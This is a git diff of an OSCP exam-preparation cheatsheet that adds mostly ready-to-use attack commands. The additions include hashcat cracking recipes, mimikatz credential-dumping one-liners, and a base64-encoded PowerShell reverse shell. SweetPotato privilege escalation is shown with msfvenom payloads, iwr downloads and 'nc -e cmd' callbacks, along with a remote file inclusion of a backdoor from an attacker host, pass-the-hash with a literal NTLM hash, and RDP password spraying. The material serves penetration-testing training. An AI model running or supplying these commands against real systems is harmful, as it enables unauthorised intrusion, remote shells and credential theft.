@@ -1,12 +1,5 @@
 # OSCP Cheatsheet
 
-**Prepared as part of my OSCP Preparation.**
-
-- Successfully passed the OSCP exam on May 20, 2024. Verify my achievement [here](https://www.credential.net/666b9a86-017d-48fa-894a-5c39ef1d7b7b).
-- Feel free to open a pull request if you have any corrections, improvements, or new additions!
-- You can access my cheatsheet from here: https://s4thv1k.com/posts/oscp-cheatsheet/ as well!
-- Helped over 20 individuals in passing their exam:) Please let me know if this helped you too ❤️
-
 # General
 
 
@@ -339,6 +332,7 @@ Windows
     /var/webmin/miniserv.log
     /var/www/html<VHOST>/__init__.py
     /var/www/html/db_connect.php
+    /var/www/html/db.php
     /var/www/html/utils.php
     /var/www/log/access_log
     /var/www/log/error_log
@@ -513,8 +507,27 @@ john hashfile --wordlist=rockyou.txt
 > 
 
 ```powershell
-#Obtain the Hash module number 
+#Obtain the Hash module number
+hashcat --help | grep -i "ntlm"
+
+#run the command
 hashcat -m <number> hash wordlists.txt --force
+
+#run with rule list (NTLM)
+hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+#keypass
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+#Kerberoast
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+#Asreproast
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+#NTLMv2
+hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt # you can also add a rule!
+
 ```
 
 ## Pivoting through SSH
@@ -633,8 +646,12 @@ lsadump::sam SystemBkup.hiv SamBkup.hiv
 lsadump::dcsync /user:krbtgt
 lsadump::lsa /patch #both these dump SAM
 
+
 #OneLiner
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam"
+
 
 ```
 
@@ -693,7 +710,11 @@ sudo ip r add <subnet> dev ligolo
 ## Port Scanning
 
 ```powershell
+#CHECK ALL SOFTWARE VERSIONS AND HTTP TITLES FOR EXPLOITS VIA GOOGLE
+
 #use -Pn option if you're getting nothing in the scan
+sudo nmap -sS -sVC -p- <IP> #go to scan
+sudo nmap -sU <IP> #always check UDP
 nmap -sC -sV <IP> -v #Basic scan
 nmap -T4 -A -p- <IP> -v #complete scan
 sudo nmap -sV -p 443 --script "vuln" 192.168.50.124 #running vuln category scripts
@@ -728,6 +749,10 @@ hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for 
 
 #download all files from FTP with one command
 wget -m --no-passive ftp://anonymous:anonymous@IP
+
+#IF files like PDF are found we can run this command to inspect the metadata
+exiftool -a -u brochure.pdf
+
 ```
 
 ## SSH enumeration
@@ -739,6 +764,9 @@ ssh uname@IP #enter the password in the prompt
 #id_rsa or id_ecdsa file
 chmod 600 id_rsa/id_ecdsa
 ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for the password, crack it using John
+
+# if we get the following error (Unable to negotiate with 192.168.208.39 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss)
+ssh -oHostKeyAlgorithms=+ssh-dss user@192.168.X.X
 
 #cracking id_rsa or id_ecdsa
 ssh2john id_ecdsa(or)id_rsa > hash
@@ -807,14 +835,21 @@ mget *
 - Directory and file discovery - Obtain any hidden files that may contain juicy information
 
 ```powershell
+#USE THE FOLLOWING WORDLISTS
+directory-list-2.3-medium.txt
+raft-large-directories-lowercase.txt
+raft-medium-directories-lowercase.txt
+common.txt
+
 dirbuster
 gobuster dir -u http://example.com -w /path/to/wordlist.txt
 python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
+ffuf -recursion -recursion-depth 1 -u http://192.168.208.58:80/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 ```
 
 - Vulnerability Scanning using nikto: `nikto -h <url>`
 - `HTTPS`SSL certificate inspection, may reveal information like subdomains, usernames…etc
-- Default credentials: Identify the CMS or service, check for default credentials, and test them out.
+- Default credentials: Identify the CMS or service, check for default credentials, and test them out. If a username is found try that as the password also!
 - Bruteforce
 
 ```powershell
@@ -948,6 +983,8 @@ showmount -e <IP>
 #Nmap UDP scan
 sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt
 
+snmpwalk -v1 -c public 192.168.X.X NET-SNMP-EXTEND-MIB::nsExtendObjects #check for hidden creds
+
 snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly
 
 snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
@@ -1009,7 +1046,9 @@ cat ../../etc/passwd
 
 #In web int should be exploited like this, find a parameters and test it out
 http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+
 #check for id_rsa, id_ecdsa
+
 #If the output is not getting formatted properly then,
 curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd 
 
@@ -1050,8 +1089,7 @@ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base
 ```powershell
 1. Obtain a php shell
 2. host a file server 
-3.
-http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
+3. http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
 we can also host a php reverseshell and obtain shell.
 ```
 
@@ -1152,6 +1190,10 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
 #For powershell use the encrypted tool that's in Tools folder
+
+#powershell base64 enocded rev shell using port 4444
+powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
 ```
 
 <aside>
@@ -1238,6 +1280,20 @@ RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999
 #GodPotato
 GodPotato.exe -cmd "cmd /c whoami"
 GodPotato.exe -cmd "shell.exe"
+
+#SweetPotato (msfvenom)
+iwr -uri http://192.168.45.215:8000/SweetPotato.exe -outfile sweetpotato.exe #upload sweet potato
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8888 -f exe -o shell.exe #shell we want to use
+iwr -uri http://192.168.45.215:8000/shell8.exe -outfile shell.exe #upload shell
+nc -lnvp 8888 #start nc listener
+.\sweetpotato.exe -p C:\Users\Public\shell.exe # run sweet potato
+
+#SweetPotato (necat)
+iwr -uri http://192.168.45.215:8000/nc.exe -outfile nc.exe #download netcat
+nc -lnvp 8888 #start nc listener
+.\sweetpotato.exe -p c:\Users\Public\nc.exe -a "192.168.45.215 8888 -e cmd" #execute command
+
+
 
 #JuicyPotatoNG
 JuicyPotatoNG.exe -t * -p "shell.exe" -a
@@ -1737,6 +1793,7 @@ grep -inr "cpassword"
 ```bash
 crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
 crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
+crackmapexec winrm 10.10.151.142 -d OSCP.EXAM -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
 ```
 
 - Decrypting the CPassword
@@ -1762,6 +1819,8 @@ gpp-decrypt "cpassword"
 ```powershell
 # Crackmapexec - check if the output shows 'Pwned!'
 crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
+crackmapexec winrm <IP> -d OSCP.EXAM -u user -H e728ecbadfb02f51ce8eed753f3ff3fd #pass the hash to try to login with winrm
+crowbar -b rdp -s 172.16.133.0/24 -U users2.txt -C passwords.txt -d #RDP password spraying
 
 # Kerbrute
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
